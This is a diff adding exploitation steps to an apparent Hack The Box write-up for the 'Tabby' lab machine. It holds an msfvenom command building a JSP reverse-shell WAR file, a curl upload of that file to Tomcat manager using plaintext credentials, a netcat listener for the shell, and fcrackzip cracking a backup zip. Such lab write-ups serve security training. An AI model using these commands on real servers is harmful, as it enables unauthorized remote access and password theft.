@@ -79,4 +79,55 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 # []() Exploitation Part
 
+> exploitation part was very easy, we need a **wat** format backdoor to upload to the server and start deploying it to get a reverse shell.
+
+* let's generate a war file with **msfvenom**.
+
+> **msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.xx LPORT=9002 -f war > xdev0.war**
+
+* after generating this file we need to upload it and deploy it as a new application.
+
+> **curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file xdev0.war "http://10.10.10.194:8080/manager/text/deploy?path=xdev0.war"**
+
+```ruby
+
+╭─xdev05@nic3One ~/Documents/HTB/Tabby  
+╰─➤  curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file xdev0.war "http://10.10.10.194:8080/manager/text/deploy?path=/xdev0.war"
+OK - Deployed application at context path [/xdev0.war]
+╭─
+
+```
+> let's start nc listener now and open this link http://10.10.10.194:8080/xdev0.war/.
+
+![](https://i.ibb.co/pytCy44/nc.png)
+
+* nice!
+
+> in this point you can use metasploit too.
+
+![](https://i.ibb.co/r3rWxQj/metasploit.png)
+
+# []()USER Part
+
+> after some enumeration, I've found a compressed backup file and after cracking this file I used its password to escalate my privilege to the user privileges.
+
+* here is the backup file
+
+![](https://i.ibb.co/nsZ1vjz/backup-file.png)
+
+* let's crack it now with **fcrackzip**
+
+> **fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip**
+
+![](https://i.ibb.co/5TFBTT6/fcrack-result.png)
+
+* let's escalate our privilege now.
+
+> **su ash**
+
+![](https://i.ibb.co/p2GjmMp/user.png)
+
+* user done!.
+
+
 
